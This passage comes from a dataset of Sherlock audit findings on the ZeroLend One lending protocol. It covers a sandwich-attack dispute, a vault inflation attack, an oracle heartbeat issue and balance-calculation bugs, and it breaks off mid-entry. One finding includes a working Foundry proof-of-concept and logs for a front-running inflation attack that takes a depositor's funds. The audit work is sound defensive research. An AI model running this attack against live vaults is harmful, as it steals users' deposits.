funds if possible should have more priority over adding new pools. If a pool already has 30 pools in it and one is temporarily non-withdrawable, surely there're 29 other working pools, no?\n\n> a pool owner could maliciously set incorrect interest rates causing withdrawals to revert. Eventually, a curator would reasonably consider such funds lost and remove the pool. They would need to remove such failing pools from their withdrawal queues for the reasons I explained in https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2432814025: to prevent losses to the new depositors and/or due to withdrawal queue limitations. Later, the pool owner could correct the interest rate, and the curator would want to re-add the pool to the vault.\n\nThis example is also invalid , a rational curator would never re-add a pool with a malicious pool owner that can set incorrect interest rates, whether they choose to correct the rates or not. The security risks are vey obvious from adding such a pool.\n\n@cvetanovv This issue does not even meet medium severity, i think it's obvious at this point that there is no valid scenario where such a thing is the only **rational** choice, judging by how difficult it is for @0xNirix to provide one.\n\n**There are only 2 possible cases here**\n1. if a pool/pool admin is malicious and cannot be withdrawn from, it should be removed and never re-added (it makes no sense to re-add a malicious pool even if it appears to be  working correctly)\n2. If the pool is not compromised but temporarily non-withdrawable it should be reordered instead of removed ( because removing might still cost some users their funds an i stated [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2433201858))\n\n**0xNirix**\n\nHere we go again in circles!\n\n> I read your comment, I believe the 30 pool limit is not a valid reason either. Reordering to preserve users funds if possible should have more priority over adding new pools. If a pool already has 30 pools in it and one is temporarily non-withdrawable, surely there're 29 other working pools, no?\n\nPlease stop replying to only part of the argument. I will just repeat - please re-read the entire comment again to see why curator may rationally decide to remove a pool.\n\n> This example is also invalid , a rational curator would never re-add a pool with a malicious pool owner that can set incorrect interest rates, whether they choose to correct the rates or not. The security risks are vey obvious from adding such a pool.\n\nProbably repeating this for the nth time as well - how does curator know that pool owner is malicious or simply made a mistake? \nAnd even if malicious pool owner, why not, if curator can very well ensure that there is no downside (because no new deposit would go to the pool) and there is only upside (can potentially get funds back).\n\n> if a pool/pool admin is malicious and cannot be withdrawn from, it should be removed and never re-added (it makes no sense to re-add a malicious pool even if it appears to be working correctly)\n> If the pool is not compromised but temporarily non-withdrawable it should be reordered instead of removed ( because removing might still cost some users their funds an i stated https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2433201858)\n\nI have given examples for both these cases with clear reasons on how a curator might end up removing and then re-adding pool. It should be pretty obvious that this is an High issue, given other similar judgements.\n\n**cvetanovv**\n\nThis issue is not High severity. To be High severity, we should not have any restrictions. Only the fact that the attack is only possible with certain curator actions makes this a Medium/Low severity. \n\nThe core of the issue lies in the lack of a clear mechanism to prevent sandwich attacks when adding or re-adding pools with existing funds.\n\nThere are a few scenarios where re-adding a previously removed pool—either compromised or non-withdrawable due to temporary liquidity constraints. And the curators can’t control pool management actions. Attackers could exploit the updated asset-share ratio post-addition to profit at the expense of existing users.\n\nGiven these factors, I agree that this is a valid concern and can be Medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143/#issuecomment-2391978988): rejected",
      "summary": "\nThis bug report discusses a vulnerability in a financial system where malicious actors can take advantage of the immediate addition of assets from a new or re-added market. This can lead to a significant financial loss for existing users as attackers can execute a \"sandwich attack\" to profit from changes in the asset-share ratio. The root cause of this vulnerability is the immediate update of total assets when adding or re-adding a market with existing assets. This issue was found by a user named 0xNirix.\n\nThe report includes a discussion between different users about the severity of this issue. Some argue that it is not a valid issue because it requires the curator to remove a pool without reallocating all the assets, which is not a rational action. However, others point out that there are scenarios where a curator may have to remove a pool with assets, such as when the pool is compromised or non-withdrawable for a long time. In these cases, the curator may want to re-add the pool later when the issue is resolved. The report concludes that this vulnerability is a medium or low severity issue because it can only be exploited under certain conditions. However, it also highlights the need for a clear mechanism to prevent sandwich attacks when adding or re-adding pools with existing funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143",
      "tags": [],
      "finders": [
        "0xNirix"
      ]
    },
    {
      "id": "41823",
      "title": "M-2: CuratedVaults are prone to inflation attacks due to not utilising virtual shares",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141 \n\n## Found by \n0xMax1mus, A2-security, Bauchibred, BiasedMerc, Jigsaw, Oblivionis, Obsidian, TessKimy, iamnmt\n## Summary\nAn attacker can frontrun a user's deposit transaction in a new vault pool position, stealing 100% of the depositors underlying token deposit by causing no shares to be minted to the user. This is caused by inflating the value of the shares to cause the user's underlying token deposit amount to round down to be worth 0 shares.\n\n## Vulnerability Detail\n[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)\n```solidity\nlibrary SharesMathLib {\n  using MathLib for uint256;\n...SKIP...\n  uint256 internal constant VIRTUAL_SHARES = 0;\n...SKIP...\n  uint256 internal constant VIRTUAL_ASSETS = 0;\n  ```\n\nThe [morpho version](https://github.com/morpho-org/morpho-blue/blob/731e3f7ed97cf15f8fe00b86e4be5365eb3802ac/src/libraries/SharesMathLib.sol) that this code is based on has these values set to non-zero, which allows them to be protected against vault inflation attacks. However ZeroLend One has these values set to `0` meaning the vault inflation protection are not in place.\n\n## POC\n<details>\n<summary>POC</summary>\nAdd the following code to the bottom of `IntegrationVaultTest::_setUpVault()`:\n\n```solidity\n    vm.startPrank(attacker);\n    loanToken.approve(address(vault), type(uint256).max);\n    collateralToken.approve(address(vault), type(uint256).max);\n    vm.stopPrank();\n\n    // ERC4626Test context address, as vm.startPrank does not change the context msg.sender in the test file\n    vm.startPrank(0x50EEf481cae4250d252Ae577A09bF514f224C6C4);\n    loanToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max); // market where we will be sending donation\n    collateralToken.approve(0xC8011cB77CC747B5F30bAD583eABfb522Be25712, type(uint256).max);\n    vm.stopPrank();\n```\n\nDeclare the attacker address in `BaseVaultTest.sol` contract under the other addresses:\n\n```solidity\naddress internal attacker = makeAddr('attacker');\n```\n\nAdd the following function to `ERC4626Test.sol`:\n```solidity\n  function testVaultInflationAttack() public {\n    uint256 attackerAssets = 1e18+1;\n    uint256 attackerDonation = 1e18;\n    uint256 supplierAssets = 1e18;\n\n    loanToken.mint(attacker, attackerAssets);\n    loanToken.mint(supplier, supplierAssets);\n\n    /// attacker front-run supplier\n    loanToken.mint(0x50EEf481cae4250d252Ae577A09bF514f224C6C4, attackerDonation); // ERC4626Test context will perform the donation as vm.startPrank isn't changing msg.sender to attacker\n    allMarkets[0].supplySimple(address(loanToken), address(vault), attackerDonation, 0); // supply vault market position\n    console.log(\"attacker donates assets:\", attackerDonation);\n\n    vm.prank(attacker);\n    uint256 attackerShares = vault.deposit(attackerAssets, attacker);\n    console.log(\"attacker deposits underlying:\", attackerAssets);\n    console.log(\"attacker shares:\", attackerShares);\n    loanToken.mint(address(vault), 1e18); // same as attacker transfering, but having issue with foundry\n    // attacker donation\n    \n    /// supplier deposit transaction\n    vm.prank(supplier);\n    uint256 supplierShares = vault.deposit(supplierAssets, supplier);\n    console.log(\"supplier deposits underlying:\", supplierAssets);\n    console.log(\"supplier shares:\", supplierShares);\n\n    console.log(\"vault underlying:\", vault.totalAssets());\n    console.log(\"vault shares:\", vault.totalSupply());\n  }\n```\n</details>\n\n```solidity\nLogs:\n  attacker donates assets: 1000000000000000000\n  attacker deposits underlying: 1000000000000000001\n  attacker shares: 1\n  supplier deposits underlying: 1000000000000000000\n  supplier shares: 0\n  vault underlying: 3000000000000000001\n  vault shares: 1\n```\n\n## Impact\n\nAs seen from the POC logs the depositor is minted 0 shares, and the attacker controls the singular share of the vault allowing them to redeem the share and get back their `2e18+1` attack funds and `1e18` of the supplier's funds. This is a clear loss of funds due to an inflation attack, leading to a High risk vulnerability as each vault will be vulnerable to this risk due to not utilising the Morpho vault inflation protections.\n\n## Code Snippet\n\n[SharesMathLib.sol](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/libraries/SharesMathLib.sol#L32-L36)\n\n## Tool used\n\nFoundry and Manual Review\n\n## Recommendation\n\nUtilise the same values as Morpho for `VIRTUAL_SHARES` and `VIRTUAL_ASSETS`:\n```solidity\nlibrary SharesMathLib {\n    using MathLib for uint256;\n\n    /// @dev The number of virtual shares has been chosen low enough to prevent overflows, and high enough to ensure\n    /// high precision computations.\n    /// @dev Virtual shares can never be redeemed for the assets they are entitled to, but it is assumed the share price\n    /// stays low enough not to inflate these assets to a significant value.\n    /// @dev Warning: The assets to which virtual borrow shares are entitled behave like unrealizable bad debt.\n    uint256 internal constant VIRTUAL_SHARES = 1e6;\n\n    /// @dev A number of virtual assets of 1 enforces a conversion rate between shares and assets when a market is\n    /// empty.\n    uint256 internal constant VIRTUAL_ASSETS = 1;\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Invalid: misleading POC. Intentionally doesn't show attackers profit as it results in a loss of funds for attacker as well\n\n\n\n**nevillehuang**\n\nDECIMAL_OFFSETS and virtual shares work [hand in hand to combat first depositor inflation attacks](https://docs.openzeppelin.com/contracts/4.x/erc4626#defending_with_a_virtual_offset), so I personally believe they are duplicates and under a single category of issues. Additionally, even if offset is zero and virtual shares is implemented, it can already make the attack non-profitable, so I would say the root cause here is the lack of implementation of a virtual share\n\n> If the offset is greater than 0, the attacker will have to suffer losses that are orders of magnitude bigger than the amount of value that can hypothetically be stolen from the user.\n\n**Honour-d-dev**\n\nThis \"attack\" result in a loss for both attacker and victim... I don't believe it is valid because IRL no one would pull of an attack where they loose funds as well, it can't even count as griefing.\n\nAlso the PoC is incomplete and misleading by omitting the fact that there's a huge loss for the attacker as well\n\n**Honour-d-dev**\n\nEscalate\n\nper above comment\n\n**sherlock-admin3**\n\n> Escalate\n> \n> per above comment\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nAlthough the grief attack will also cause the malicious user to take losses, it is possible, and I think Medium severity is appropriate for this issue.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141/#issuecomment-2392010510): rejected",
      "summary": "\n\nThis bug report discusses a vulnerability found in the CuratedVaults code that can be exploited by attackers to steal a user's deposit. The vulnerability is caused by the code not utilizing virtual shares, which are used to protect against inflation attacks. The report includes a proof of concept and recommendations for fixing the issue. The severity of the vulnerability is considered to be medium and it has been found to have duplicates. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/141",
      "tags": [],
      "finders": [
        "TessKimy",
        "0xMax1mus",
        "Oblivionis",
        "Obsidian",
        "Jigsaw",
        "BiasedMerc",
        "Bauchibred",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41822",
      "title": "M-1: Using the same heartbeat for multiple price feeds, causing DOS",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/9 \n\n## Found by \n000000, 0xAlix2, 0xAristos, 0xDemon, 0xMax1mus, 0xlrivo, A2-security, Bauchibred, EgisSecurity, HackTrace, Honour, Obsidian, aman, emmac002, iamnmt, perseus, sheep, theweb3mechanic, zarkk01\n### Summary\n\nChainlink price feeds usually update the price of an asset once it deviates a certain percentage. For example the ETH/USD price feed updates on 0.5% change of price. If there is no change for 1 hour, the price feed updates again - this is called heartbeat: https://data.chain.link/feeds/ethereum/mainnet/eth-usd.\n\nAccording to the docs, the protocol should be compatible with any EVM-compatible chain. On the other hand, different chains use different heartbeats for the same assets.\n\nDifferent chains have different heartbeats:\n\nUSDT/USD:\n* Linea: ~24 hours, https://data.chain.link/feeds/linea/mainnet/usdt-usd\n* Polygon: ~27 seconds, https://data.chain.link/feeds/polygon/mainnet/usdt-usd\n\nBNB/USD:\n* Ethereum: ~24 hours, https://data.chain.link/feeds/ethereum/mainnet/bnb-usd\n* Optimism: ~20 minutes, https://data.chain.link/feeds/optimism/mainnet/bnb-usd\n\nIn [`PoolGetters::getAssetPrice`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L158C12-L163), the protocol is using the same heartbeat for all assets/chains, which is 30 minutes.\n\nThis causes the protocol to regularly revert unexpectedly (DOS).\n\n### Root Cause\n\nThe same heartbeat is being used for all chains/assets, in `PoolGetters::getAssetPrice`.\n\n### Impact\n\nEither constant downtime leading to transactions reverting or insufficient staleness checks leading to the possibility of the old price.\n\n### PoC\n\n1. User calls `withdraw`, to withdraw his collateral (in USDT) from a certain pool on Linea\n2. The `withdraw` function calls other multiple functions leading to `GenericLogic::calculateUserAccountData` (which gets the price of an asset)\n3. The contract calls the Oracle USDT/USD feed on Linea\n4. At the moment the heartbeat check for every price feed on every chain is set to 30 minutes\n5. The price was not updated for more than 2 hours since the heartbeat for the pair is 24 hours and also not changed 1% in either direction\n6. The transaction reverts causing DoS\n\n### Mitigation\n\nIntroduce a new parameter that could be passed alongside the oracle which refers to the heartbeat of that oracle, so that `updatedAt` could be compared with that value.",
      "summary": "\nThis bug report is about a problem with using the same heartbeat for multiple price feeds in the Chainlink protocol. The protocol updates the price of an asset when it changes by a certain percentage, and if there is no change, it updates again after a set amount of time. However, different chains have different update times for the same assets, which can cause issues. The root cause is that the same heartbeat is being used for all chains and assets, leading to unexpected reverts and possible old prices being used. A potential solution is to introduce a new parameter that can be passed for each oracle, so that the update time can be compared and adjusted accordingly. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/9",
      "tags": [],
      "finders": [
        "perseus",
        "0xDemon",
        "0xAlix2",
        "iamnmt",
        "aman",
        "zarkk01",
        "0xMax1mus",
        "sheep",
        "000000",
        "emmac002",
        "EgisSecurity",
        "theweb3mechanic",
        "Obsidian",
        "0xAristos",
        "A2-security",
        "HackTrace",
        "Bauchibred",
        "Honour",
        "0xlrivo"
      ]
    },
    {
      "id": "41821",
      "title": "H-11: Wrong calculation of supply/debt balance of a position, disrupting core system functionalities",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473 \n\n## Found by \n000000, 0xAlix2, A2-security, BiasedMerc, Bigsam, DenTonylifer, Honour, JCN, JuggerNaut63, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\\_05, almurhasan, charlesjhongc, coffiasd, dany.armstrong90, denzi\\_, dhank, ether\\_sky, iamnmt, jah, joshuajee, lemonmon, neon2835, oxelmiguel, perseus, silver\\_eth, trachev\n## Summary\nThere is an error in the calculation of the supply/debt balance of a position, impacting a wide range of operations across the system, including core lending features.\n\n## Vulnerability Detail\n`PositionBalanceConfiguration` library have 2 methods to provide supply/debt balance of a position as follows:\n\n```solidity\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n    uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n>   return self.supplyShares + increase;\n  }\n\n  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {\n    uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);\n>   return self.debtShares + increase;\n  }\n```\n\nThe implementation contains a critical error as it returns the `share amount` rather than the `asset amount` held. This issue is evident when the function utilizes `index`, same as `self.lastSupplyLiquidityIndex` or `self.lastDebtLiquidityIndex`. Each function returns `self.supplyShares` and `self.debtShares`, which are share amounts, while the caller expects accurate asset balances. A similar issue occurs when a different index is used, still resulting in an incorrect balance that is significantly lower than the actual balance.\n\nBelow I provide a sample scenario to check supply balance (`getSupplyBalance` using same liquidity index):\n1. Suppose `position.lastSupplyLiquidtyIndex` = `2 RAY` (2e27)  (Time passed as the liquidity increased).\n2. Now position is supplied `2 RAY` of assets, it got `1 RAY` (2RAY.rayDiv(2RAY)) shares minted.\n3. Then `position.getSupplyBalance(2 RAY)` returns `1 RAY` while we expect `2 RAY` which is correct balance.\n\nBelow is a foundary PoC to validate one live example: failure to fully repay with type(uint256).max due to balance error. Full script can be found [here](https://gist.github.com/worca333/8103ca8527e918b4fc8ab06b71ac798a).\n```solidity\n  function testRepayFailWithUint256MAX() external {\n    _mintAndApprove(alice, tokenA, 4000 ether, address(pool));\n\n    // Set the reserve factor to 1000 bp (10%)\n    poolFactory.setReserveFactor(10_000);\n\n    // Alice supplies and borrows tokenA from the pool\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, 2000 ether, 0);\n    pool.borrowSimple(address(tokenA), alice, 800 ether, 0);\n\n    vm.warp(block.timestamp + 10 minutes);\n\n    assertGt(pool.getDebt(address(tokenA), alice, 0), 0);\n    vm.stopPrank();\n\n    // borrow again: this will update reserve.lastDebtLiquidtyIndex\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenA), alice, 20 ether, 0);\n    vm.stopPrank();\n\n    pool.forceUpdateReserve(address(tokenA));\n\n    console.log(\"Debt before repay: \", pool.getDebt(address(tokenA), alice, 0));\n    vm.startPrank(alice);\n    tokenA.approve(address(pool), UINT256_MAX);\n    pool.repaySimple(address(tokenA), UINT256_MAX, 0);\n    console.log(\"Debt after  repay: \", pool.getDebt(address(tokenA), alice, 0));\n\n    console.log(\"Assert: Debt still exists after full-repay with UINT256_MAX\");\n    assertNotEq(pool.getDebt(address(tokenA), alice, 0), 0);\n    vm.stopPrank();\n  }\n```\n\nRun the test by \n```bash\nforge test --mt testRepayFailWithUint256MAX -vvv\n```\n\nLogs:\n```bash\n[PASS] testRepayFailWithUint256MAX() (gas: 567091)\nLogs:\n  Debt before repay:  819999977330884982376\n  Debt after  repay:  929433690028148\n  Assert: Debt still exists after full-repay with UINT256_MAX\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.68ms (1.18ms CPU time)\n\nRan 1 test suite in 281.17ms (4.68ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## Impact\nSince these functions are integral to the core pool/position logic and are utilized extensively across the system, the impacts are substantial.\n1. In `SupplyLogic.executeWithdraw`, withdrawl is processed based on wrong position supply balance which potentially could fail.\n```solidity\n  function executeWithdraw(\n    ...\n  ) external returns (DataTypes.SharesType memory burnt) {\n    DataTypes.ReserveData storage reserve = reservesData[params.asset];\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n    reserve.updateState(params.reserveFactor, cache);\n\n>   uint256 balance = balances[params.asset][params.position].getSupplyBalance(cache.nextLiquidityIndex);\n    ...\n```\n\n2. In `BorrowLogic.executeRepay`, it would fail\n  - to do full-repay because `payback.assets` is not the total debt amount\n  - to do `setBorrwing(reserve.id, false)` because `getDebtBalance` almost unlikely goes 0, as it can't do full repay\n```solidity\n  function executeRepay(\n    ...\n  ) external returns (DataTypes.SharesType memory payback) {\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n    reserve.updateState(params.reserveFactor, cache);\n>   payback.assets = balances.getDebtBalance(cache.nextBorrowIndex);\n\n    // Allows a user to max repay without leaving dust from interest.\n    if (params.amount == type(uint256).max) {\n>     params.amount = payback.assets;\n    }\n\n    ...\n\n>   if (balances.getDebtBalance(cache.nextBorrowIndex) == 0) {\n      userConfig.setBorrowing(reserve.id, false);\n    }\n\n    IERC20(params.asset).safeTransferFrom(msg.sender, address(this), payback.assets);\n    emit PoolEventsLib.Repay(params.asset, params.position, msg.sender, payback.assets);\n  }\n```\n\n3. In `NFTPositionManagerSetter._supply` and `NFTPositionManagerSetter._borrow`, they call `NFTRewardsDistributor._handleSupplies` and `NFTRewardsDistributor._handleDebt` with wrong balance amounts which would lead to incorrect reward distribution.\n```solidity\n  function _supply(AssetOperationParams memory params) internal nonReentrant {\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    IPool pool = IPool(_positions[params.tokenId].pool);\n\n    IERC20(params.asset).forceApprove(address(pool), params.amount);\n    pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);\n\n    // update incentives\n>   uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);\n    _handleSupplies(address(pool), params.asset, params.tokenId, balance);\n\n    emit NFTEventsLib.Supply(params.asset, params.tokenId, params.amount);\n  }\n\n  function _borrow(AssetOperationParams memory params) internal nonReentrant {\n    if (params.target == address(0)) revert NFTErrorsLib.ZeroAddressNotAllowed();\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    // check permissions\n    _isAuthorizedForToken(params.tokenId);\n\n    IPool pool = IPool(_positions[params.tokenId].pool);\n    pool.borrow(params.asset, params.target, params.amount, params.tokenId, params.data);\n\n    // update incentives\n>   uint256 balance = pool.getDebt(params.asset, address(this), params.tokenId);\n    _handleDebt(address(pool), params.asset, params.tokenId, balance);\n\n    emit NFTEventsLib.Borrow(params.asset, params.amount, params.tokenId);\n  }\n```\n\n4. In `NFTPositionManagerSetter._repay`, wrong balance is used to estimate debt status and refunds.\n  - It will almost likely revert with `NFTErrorsLib.BalanceMisMatch` because `debtBalance` is share amount versus `repaid.assets` is asset amount\n  - `currentDebtBalance` will never go 0 because it almost unlikely gets repaid in full, hence refund never happens\n  - `_handleDebt` would work wrongly due to incorrect balance \n```solidity\n  function _repay(AssetOperationParams memory params) internal nonReentrant {\n    ...\n>   uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n>   uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n\n    if (previousDebtBalance - currentDebtBalance != repaid.assets) {\n      revert NFTErrorsLib.BalanceMisMatch();\n    }\n\n    if (currentDebtBalance == 0 && repaid.assets < params.amount) {\n      asset.safeTransfer(msg.sender, params.amount - repaid.assets);\n    }\n\n    // update incentives\n    _handleDebt(address(pool), params.asset, params.tokenId, currentDebtBalance);\n\n    emit NFTEventsLib.Repay(params.asset, params.amount, params.tokenId);\n  }\n```\n\n5. In `CuratedVault.totalAssets`, it returns wrong asset amount.\n```solidity\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n>     assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/configuration/PositionBalanceConfiguration.sol#L126-L140\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L118\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L126\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L44-L82\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119-L121\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372\n\n## Tool used\nManual Review, Foundary\n\n## Recommendation\nThe `getSupplyBalance` and `getDebtBalance` functions need an update to accurately reflect the balance. Referring to `getSupplyBalance` and `getDebtBalance` functions from `ReserveSuppliesConfiguration`, we can make updates as following:\n\n```diff\n  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-   return self.supplyShares + increase;\n+   return self.supplyShares.rayMul(index);\n  }\n\n  function getDebtBalance(DataTypes.PositionBalance storage self, uint256 index) internal view returns (uint256 debt) {\n-   uint256 increase = self.debtShares.rayMul(index) - self.debtShares.rayMul(self.lastDebtLiquidtyIndex);\n-   return self.debtShares + increase;\n+   return self.debtShares.rayMul(index);\n  }\n```\n\n\n\n## Discussion\n\n**DemoreXTess**\n\nEscalate\n\nAs I stated in #107 , there are two issues categorized in the same pool. I know it's same problem which is applied to two different variable but the debt and supply are completely different things. Those issues have completely different impacts on the protocol even the problem is similar.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> As I stated in #107 , there are two issues categorized in the same pool. I know it's same problem which is applied to two different variable but the debt and supply are completely different things. Those issues have completely different impacts on the protocol even the problem is similar.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Tomiwasa0**\n\n2 different issues with 2 different impacts. 2 different root cause but similar. \nThis should be separated into two issues\nIncorrect Supply - 189, 210, 1, 19, 29, 84,127,149, 51, 243, 250, 269, 313, 357, 420, 440, 491, 506.\nIncorrect Debt - 190, 208, 2, 30 126, 152, 157, 161, 180, 254 ,270, 314, 421, 459. \n\nSome Watsons submitted this together - 52, 473, 138, 272, 444, 469, 503, 504, 516. \n\nI missed some anyone can help add them also. But my point is in line with @DemoreXTess  these are two different issues with different impacts hence they should be classified appropriately. Thank you.\n\n**cvetanovv**\n\nI disagree with the escalation.\n\nThe Lead Judge correctly duplicated them under the same logical error rule.\n\n> If the following issues appear in multiple places, even in different contracts\n> - Issues with the same logic mistake.\n\nMoreover, the root cause is the same. It is that the functions return `share amount` instead of `asset amount`.\n\nYou might also look at some Watson's who have written two issues and see how the difference is only a few words (for example, #151 and #152).\n\nPlanning to reject the escalation and leave the issue as is.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473/#issuecomment-2391694709): rejected",
      "summary": "\nSummary: This bug report discusses an error in the calculation of the supply/debt balance of a position, which affects core system functionalities. The error occurs in the `PositionBalanceConfiguration` library, where two methods return the `share amount` instead of the `asset amount` held, resulting in incorrect balances. This impacts operations such as lending, borrowing, and reward distribution. The bug has been identified and confirmed through manual review and the Foundary tool. A recommendation is made to update the affected functions to accurately reflect the balance. There was a discussion about whether this issue should be escalated as two separate issues, but it was ultimately decided to leave it as is. The bug has been classified as High and has duplicates.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473",
      "tags": [],
      "finders": [
        "DenTonylifer",
        "JCN",
        "perseus",
        "Tendency",
        "dany.armstrong90",
        "trachev",
        "0xAlix2",
        "silver\\_eth",
        "BiasedMerc",
        "iamnmt",
        "lemonmon",
        "joshuajee",
        "jah",
        "KupiaSec",
        "denzi\\_",
        "JuggerNaut63",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "Nihavent",
        "neon2835",
        "dhank",
        "Varun\\_05",
        "Bigsam",
        "oxelmiguel",
        "TessKimy",
        "almurhasan",
        "Honour",
        "coffiasd",
        "charlesjhongc"
      ]
    },
    {
      "id": "41820",
      "title": "H-10: Interest rate is updated before updating the debt when repaying debt",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/413 \n\n## Found by \n000000, 0xweebad, A2-security, JCN, Obsidian, Tendency, TessKimy, Varun\\_05, almurhasan, ether\\_sky, imsrybr0, lemonmon, stuart\\_the\\_minion, trachev\n### Summary\n\nInterest rate is updated before updating the debt when repaying debt in `BorrowLogic@executeRepay` leading to an incorrect total debt being used when calculating the new interest rates and causing suppliers to keep accruing interest based on the previous debt and even if there are no ongoing borrows anymore.\n\n### Root Cause\n\n[BorrowLogic](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L117-L161)\n```solidity\n  function executeRepay(\n    DataTypes.ReserveData storage reserve,\n    DataTypes.PositionBalance storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies,\n    DataTypes.UserConfigurationMap storage userConfig,\n    DataTypes.ExecuteRepayParams memory params\n  ) external returns (DataTypes.SharesType memory payback) {\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n    reserve.updateState(params.reserveFactor, cache);\n    payback.assets = balances.getDebtBalance(cache.nextBorrowIndex);\n\n    // Allows a user to max repay without leaving dust from interest.\n    if (params.amount == type(uint256).max) {\n      params.amount = payback.assets;\n    }\n\n    ValidationLogic.validateRepay(params.amount, payback.assets);\n\n    // If paybackAmount is more than what the user wants to payback, the set it to 